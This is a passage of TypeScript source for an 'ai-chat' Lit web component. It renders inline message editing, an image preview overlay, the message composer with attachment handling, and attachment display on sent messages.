          class="message__edit-input" part="edit-input"
          .value=${this._editDraft}
          aria-label=${this._labels.edit}
          @input=${(e: Event) => {
            const ta = e.target as HTMLTextAreaElement;
            this._editDraft = ta.value;
            this._autosize(ta);
          }}
          @keydown=${onKeydown}
        ></textarea>
        <div class="message__edit-actions" part="edit-actions">
          <button type="button" class="message__edit-btn message__edit-btn--cancel"
                  part="edit-cancel-button"
                  @click=${() => this._cancelEdit()}>
            ${this._labels.cancelEdit}
          </button>
          <button type="button" class="message__edit-btn message__edit-btn--save"
                  part="edit-save-button"
                  @click=${() => this._confirmEdit(m)}>
            ${this._labels.saveEdit}
          </button>
        </div>
      </div>
    `;
  }

  /**
   * Open the full-size preview for an image attachment. Fires a cancelable
   * `ai-chat:preview` first, so a consumer can take over with their own
   * lightbox/gallery (`e.preventDefault()`) instead of the built-in overlay.
   */
  private _openPreview(a: Attachment): void {
    const ev = new CustomEvent('ai-chat:preview', {
      detail: { attachment: a },
      bubbles: true,
      composed: true,
      cancelable: true,
    });
    if (!this.dispatchEvent(ev)) return; // consumer handled it
    this._preview = a;
  }

  /** Close the image preview overlay. */
  private _closePreview(): void {
    this._preview = null;
  }

  /** Full-size image preview overlay. Click the backdrop or press Esc to close. */
  private _renderPreview() {
    const a = this._preview;
    if (!a) return nothing;
    return html`
      <div class="preview" part="preview" role="dialog" aria-modal="true"
           aria-label=${this._fill(this._labels.previewImage, a.name)}
           @click=${this._closePreview}>
        <img class="preview__img" part="preview-image" src=${a.url} alt=${a.name} />
        <button type="button" class="preview__close" part="preview-close"
                aria-label=${this._labels.closePreview}
                @click=${this._closePreview}>${closeIcon}</button>
      </div>
    `;
  }

  /** Enter inline-edit mode for a user message: swap its bubble for a textarea. */
  private _startEdit(m: ChatMessage): void {
    if (m.role !== 'user') return;
    this._editingId = m.id;
    this._editDraft = m.content;
    // Focus + select the textarea once it renders.
    void this.updateComplete.then(() => {
      const ta = this.shadowRoot?.querySelector<HTMLTextAreaElement>(
        '.message__edit textarea',
      );
      if (!ta) return;
      this._autosize(ta);
      ta.focus();
      ta.select();
    });
  }

  /** Leave edit mode without saving, returning focus to the message's edit button. */
  private _cancelEdit(): void {
    this._editingId = null;
    this._editDraft = '';
  }

  /**
   * Confirm an edit. Fires the cancelable `ai-chat:message-edit` event and then
   * leaves edit mode. The component does NOT mutate `.messages` — the consumer
   * owns what "edit" means (typically: overwrite this turn, drop everything
   * after it, and resend). Empty edits and no-op edits are ignored.
   */
  private _confirmEdit(m: ChatMessage): void {
    const newContent = this._editDraft.trim();
    const index = this.messages.indexOf(m);
    // Nothing to do for an empty edit, an unchanged edit, or a stale message.
    if (!newContent || newContent === m.content || index === -1) {
      this._cancelEdit();
      return;
    }
    this.dispatchEvent(
      new CustomEvent('ai-chat:message-edit', {
        detail: { index, message: m, newContent },
        bubbles: true,
        composed: true,
        cancelable: true,
      }),
    );
    this._cancelEdit();
  }

  /** Copy a whole message's text to the clipboard, with brief button feedback. */
  private _onCopyMessage(e: Event, m: ChatMessage): void {
    const btn = (e.currentTarget as HTMLElement) ?? null;
    void navigator.clipboard?.writeText(m.content).then(() => {
      if (!btn) return;
      btn.classList.add('message__action--done');
      window.setTimeout(() => btn.classList.remove('message__action--done'), 1200);
    });
  }

  /** Format a timestamp as a short local time, e.g. "3:45 PM". */
  private _formatTime(ts: number): string {
    try {
      return new Date(ts).toLocaleTimeString(undefined, {
        hour: 'numeric',
        minute: '2-digit',
      });
    } catch {
      return '';
    }
  }

  private _renderComposer() {
    // One rounded box: the textarea sits on top (borderless, transparent) and a
    // bottom action row holds tool buttons on the left and send/stop on the
    // right. When `allow-attachments` is on, a staged-attachment tray sits above
    // the textarea, a built-in attach button leads the start slot, and the box
    // is a drop zone. The `composer-actions-start` / `-end` slots stay open for
    // consumer buttons (mic, TTS, ...) with no re-layout.
    const boxClasses = classMap({
      composer__box: true,
      'composer__box--dragover': this._dragging,
    });
    // Send is enabled when there's text OR at least one staged attachment.
    const canSend = !!this._input.trim() || this._pending.length > 0;
    return html`
      <form class="composer" part="composer" @submit=${this._onSubmit}>
        <div
          class=${boxClasses}
          part="composer-box"
          @dragover=${this._onDragOver}
          @dragleave=${this._onDragLeave}
          @drop=${this._onDrop}
        >
          ${this._pending.length ? this._renderPendingTray() : nothing}
          <textarea
            class="composer__input"
            part="input"
            rows="1"
            .value=${this._input}
            .placeholder=${this.placeholder}
            ?disabled=${this.disabled}
            aria-label=${this._labels.inputLabel}
            @input=${this._onInput}
            @keydown=${this._onKeydown}
            @paste=${this._onPaste}
          ></textarea>
          <div class="composer__actions" part="composer-actions">
            <div class="composer__actions-start" part="composer-actions-start">
              ${
                // The button is optional (hide-attach-button), but the hidden
                // file input renders whenever attachments are allowed so paste /
                // drop / a custom trigger (openFilePicker()) all keep working.
                this.allowAttachments
                  ? html`${
                      this.hideAttachButton
                        ? nothing
                        : html`<button type="button" part="attach-button"
                            class="btn btn--attach"
                            ?disabled=${this.disabled}
                            @click=${this._openPicker}
                            aria-label=${this._labels.attach}>
                            <slot name="attach-icon">${attachIcon}</slot>
                          </button>`
                    }
                    <input class="composer__file" type="file"
                      accept=${this.accept}
                      ?multiple=${this.maxAttachments > 1}
                      @change=${this._onFilePick}
                      aria-hidden="true" tabindex="-1" hidden />`
                  : nothing
              }
              <slot name="composer-actions-start"></slot>
            </div>
            <div class="composer__actions-end" part="composer-actions-end">
              <slot name="composer-actions-end"></slot>
              ${
                this._busy
                  ? html`<button type="button" part="stop-button" class="btn btn--stop"
                          @click=${() => this.stop()} aria-label=${this._labels.stop}>
                          <slot name="stop-icon"><span class="btn__square"></span></slot>
                        </button>`
                  : html`<button type="submit" part="send-button" class="btn btn--send"
                          ?disabled=${this.disabled || !canSend} aria-label=${this._labels.send}>
                          <slot name="send-icon">${sendIcon}</slot>
                        </button>`
              }
            </div>
          </div>
        </div>
      </form>
    `;
  }

  /** The row of staged-attachment chips inside the composer box. */
  private _renderPendingTray() {
    return html`
      <div class="composer__attachments" part="composer-attachments">
        ${repeat(
          this._pending,
          (a) => a.id,
          (a) => html`
            <div class="attachment-chip" part="attachment-chip" title=${a.name}>
              ${
                a.kind === 'image'
                  ? html`<button type="button" class="attachment-chip__thumb-btn"
                           aria-label=${this._fill(this._labels.previewImage, a.name)}
                           @click=${() => this._openPreview(a)}>
                           <img class="attachment-chip__thumb" src=${a.url} alt=${a.name} />
                         </button>`
                  : html`<span class="attachment-chip__icon" aria-hidden="true">${fileIcon}</span>`
              }
              <span class="attachment-chip__name">${a.name}</span>
              <button type="button" part="attachment-remove"
                class="attachment-chip__remove"
                @click=${() => this._removeAttachment(a.id)}
                aria-label=${this._labels.removeAttachment}>
                ${closeIcon}
              </button>
            </div>
          `,
        )}
      </div>
    `;
  }

  /** Render the attachments on a sent message (above its text). */
  private _renderMessageAttachments(m: ChatMessage) {
    if (!m.attachments?.length) return nothing;
    const images = m.attachments.filter((a) => a.kind === 'image');
    const files = m.attachments.filter((a) => a.kind !== 'image');
    // Grid sizing keys off the image count: 1 shows larger, 2+ tile into fixed
    // square cells so a wide screenshot can't stretch the bubble to full width.
    const gridClass =
      images.length === 1 ? 'message__images--single' : 'message__images--grid';
    return html`
      <div class="message__attachments" part="message-attachments">
        ${
          images.length
            ? html`<div class="message__images ${gridClass}"
                     style=${images.length > 1
                       ? `--_cols:${Math.min(images.length, 3)}`
                       : ''}>
                ${repeat(
                  images,
                  (a) => a.id,
                  (a) => html`<button type="button"
                    class="message__image-btn"
                    title=${a.name}
                    aria-label=${this._fill(this._labels.previewImage, a.name)}
                    @click=${() => this._openPreview(a)}>
                    <img
                      class="message__attachment message__attachment--image"
                      part="message-attachment" src=${a.url} alt=${a.name}
                      loading="lazy" />
                  </button>`,
                )}
              </div>`
            : nothing
        }
        ${repeat(
          files,
          (a) => a.id,
          (a) => html`<span class="message__attachment message__attachment--file"
                       part="message-attachment" title=${a.name}>
                       <span class="message__attachment-icon" aria-hidden="true">${fileIcon}</span>
                       <span class="message__attachment-name">${a.name}</span>
                     </span>`,
        )}
      </div>
    `;
  }
}

declare global {
  interface HTMLElementTagNameMap {
    'ai-chat': AiChat;
  }
}
